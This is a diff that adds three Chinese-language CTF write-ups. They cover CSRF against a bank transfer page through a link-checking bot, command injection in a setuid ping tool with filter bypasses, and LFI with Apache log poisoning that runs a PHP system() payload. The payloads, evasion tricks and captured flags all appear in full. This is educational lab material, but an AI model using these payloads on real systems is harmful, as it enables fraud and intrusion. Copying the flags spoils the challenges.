@@ -1542,25 +1542,66 @@ payload：
 
 *📌Question :*
 
+```text
+给我💰
+```
 
+![16-01](./images/img-20260929040746_msedge_compressed.jpg)
 
 
 
 *📌Solution :*
 
+首页已点明，“小虎鲸会亲自打开链接处理”；异常反馈页面中，“小虎鲸核验期间**保持自己账户的登录状态**， 将在浏览器中**直接打开您提交的链接**进行核实”。这是可乘之机。
 
+注册登录后，打开转账页面，ctrl+u 主要部分：
+
+```html
+<main class="container">
+
+<section class="card" style="max-width:560px">
+  <div class="card-head">
+    <h2>我要转账</h2>
+    <span class="head-extra">单笔限额 ¥5,000,000</span>
+  </div>
+  <p class="muted">输入对方用户名与金额，即时到账。单笔限额 <b>¥5,000,000</b>，金额为整数（元）。</p>
+  <!-- TODO(v2): 安全加固——转账接口 POST 化 + 防伪造令牌 + 支付密码，排到下个迭代（科技部小张） -->
+  <form class="transfer-form" method="get" action="/transfer/do">
+    <label>收款账户（用户名）<input type="text" name="to" placeholder="例如：xiaohujing" required></label>
+    <label>转账金额（元）<input type="text" name="amount" placeholder="例如：100" required></label>
+    <button class="btn primary" type="submit">立即转账</button>
+  </form>
+  <p class="muted small">温馨提示：也可以给自己转账试试（本行支持卡内互转）。</p>
+</section>
+
+</main>
+```
+
+所以转账用的是 get 请求，而且缺乏安全措施。那么给自己（qweqwe）转账（10元）试一下，发现 get 请求了 `/transfer/do?to=qweqwe&amount=10` 这个地址。
+
+打开异常反馈页面，并打开F12——网络，正常填写一下网页表单并提交，然后在网络里发现有一个对 feedback 的 post 请求，查看它的负载——查看源，知晓 post 请求格式形如 `description=123&url=123` 。
+
+那么尝试在“问题链接”处填写 `http://8000-6f71730e-f215-4af6-9d65-a7e5e83b1bbd.challenge.ctfplus.cn/transfer/do?to=qweqwe&amount=999999` ，提交，等一会儿刷新看到下方该条反馈的状态变为“小虎鲸已核验”，上方余额也增加了 999999 元。
+
+![16-02](./images/img-20260929120121_msedge_compressed.jpg)
+
+然后来到“贵金属专区”，点立即购买，即可。
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{8ab4238e-f925-4ae8-a883-774bb851c8bc}`
 
 
 
 *📌Summary :*
 
-
+- **CSRF（跨站请求伪造）**：攻击者让**已登录的受害者**在不知情的情况下，向目标站点发一个“看起来像正常业务”的请求。受害者浏览器自动带上 Cookie，服务器就当成受害者本人在操作。
+- **CSRF 成立需要**：
+  - 受害者已登录（有相应的 Cookie）  
+  - 浏览器自动带凭据（同站请求 / Lax 下顶层 GET）  
+  - 请求无二次确认（无 CSRF Token / 非 POST / 无支付密码）
 
 ---
 
@@ -1568,25 +1609,94 @@ payload：
 
 *📌Question :*
 
+```text
+怎么有这么多命令要学习...不过我听说bash语言好像存在一些特殊语法
+```
+
+提示1：
+
+```text
+某个常用的工具好像有神奇作用
+```
+
+提示2：
+
+```text
+也许刚好时间卡在某一章的时候会有神奇的反应
+```
 
 
 
+*📌Solution_0 :*
 
-*📌Solution :*
+```bash
+cd
+ls -a  # 发现目录里面有个 notes.txt
+
+cat notes.txt  # 查看内容
+```
+
+输出：
+
+```text
+运维备忘
+====
+1. 网络不通时用 /usr/local/bin/pingx 排查（root 装的诊断工具，别乱动）。
+2. 审计说 /flag 权限是 400，只有 root 能读——可我一直都是普通用户在跑诊断啊。
+```
+
+或者 `find /usr -perm -4000` 命令，看一下设置了 setuid 位的文件，输出里面也有 pingx 。
+
+这说明 `pingx` 工具是有 root 权限的，“普通用户跑诊断”是因为 setuid root。
+
+那么 `pingx --help` 一下发现就是 `ping` 的帮助，所以按照 `ping` 的命令去试。输入 `pingx 127.0.0.1;id` ，返回里发现 `id` 命令能够被执行！
+
+那么执行 `pingx "127.0.0.1;cat /flag"` ，发现 `flag` 关键字会被 waf 拦截。
+
+再尝试执行 `pingx "127.0.0.1;head</fla''g"` ，搞定。
+
+![17-01](./images/img-20260929150450_msedge_compressed.jpg)
 
 
+
+*📌Solution_1 :*
+
+前端有个 `terminal.js` ，有能直接用的信息，照着抄就行了。
+
+![17-02](./images/img-20260929150712_msedge_compressed.jpg)
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{d9c628c9-2775-4c00-a30e-439021f33762}`
 
 
 
 *📌Summary :*
 
+- Linux 文件权限里有一个特殊位：**setuid**。显示在属主的执行位上，用 `s` 代替 `x`：
 
+  ```
+  -rwsr-xr-x 1 root root 16376 ... /usr/local/bin/pingx
+   ^^^
+   这里的 s 就是 setuid
+  ```
+
+  含义：**不管谁运行这个程序，进程都以文件属主（这里是 root）的身份执行。**
+
+  本来普通用户 `ping` 需要原始套接字（特权操作），所以发行版里的 `ping` 常带 setuid。本题的 `pingx` 就是一个「自定义 ping 工具」，并且是 root 的 setuid。
+
+- shell 常用的拼接：
+
+  | 写法         | 含义                                                         |
+  | ------------ | ------------------------------------------------------------ |
+  | `"abc"`      | 双引号：内部 `$变量` 会被展开                                |
+  | `'abc'`      | 单引号：内部一切原样，不展开                                 |
+  | `fla''g`     | `''` 是空字符串，拼接后仍是 `flag`，但源码字符串里没有连续的 `flag` 四个字母 |
+  | `head</flag` | `<` 是重定向，`head` 与 `<` 之间**可以不加空格**             |
+  | `${IFS}`     | IFS 默认是「空格/制表/换行」，可当空格用（注意：写在双引号里会被外层 shell 先展开） |
+  | `/fla*`      | 通配符 `*` 匹配任意尾巴，`/fla*` 可匹配到 `/flag`            |
 
 ---
 
@@ -1594,25 +1704,48 @@ payload：
 
 *📌Question :*
 
+```text
+这好像是伪造的实验室官网，找一找与 pkwsec.com 的不同之处吧
+```
 
+提示：
+
+```text
+服务器日志在哪里呢
+```
 
 
 
 *📌Solution :*
 
+和真站对比，发现多出来了“小虎鲸的文档库”（进入按钮在其下方被隐藏起来了鼠标放上去才能显示，或者检查元素/源代码可以找到入口），进去之后发现 get 请求形如 `/docs.php?file=docs/intro.php` ，后面这个 `file=文件地址` 或许可以利用。
 
+访问 `/docs.php?file=/var/www/html/docs.php` ，发现网页无限循环嵌套生成了一大堆页面，一直加载中，很卡。这是因为 `docs.php` 又包含了自己，无限递归，说明后端代码用的是会执行 php 的方式（ `include` / `require` ），不是只读文本（ `file_get_contents` ）。
+
+联想到提示“服务器日志在哪里呢”。那么 f12网络 看一下响应标头，发现 server 是 apache，所以尝试访问一下 `/docs.php?file=/var/log/apache2/access.log` ，成功了！下面回显出来一大段日志，
+
+Apache 默认会把请求的 UA（ `User-Agent` ）记进 `access.log`。所以我们发一个 get 请求，带上下面这样的 ua：
+
+```php
+<?php system('cat /flag'); ?>
+```
+
+带上这个 ua，再次访问 `/docs.php?file=/var/log/apache2/access.log` ，然后再多刷新一次网页（因为要查看刚刚写入的日志），ctrl+f 搜 pkwctf，即可。
+
+![18-01](./images/img-20260929131732_msedge_compressed.jpg)
 
 
 
 *📌FLAG :*
 
-
+`PKWCTF{fcb10d4a-fc46-4d02-bc19-68b6fe0bffc0}`
 
 
 
 *📌Summary :*
 
-
+- 如果后端直接 `include($_GET['file'])` 而不做好过滤，就是经典的 **LFI（Local File Inclusion，本地文件包含）**。
+- 只要能让某个文件里出现 `<?php ... ?>`，再被后端 include（或其他可以执行 php 的方式），就能 **执行命令（RCE）**。
 
 ---
 
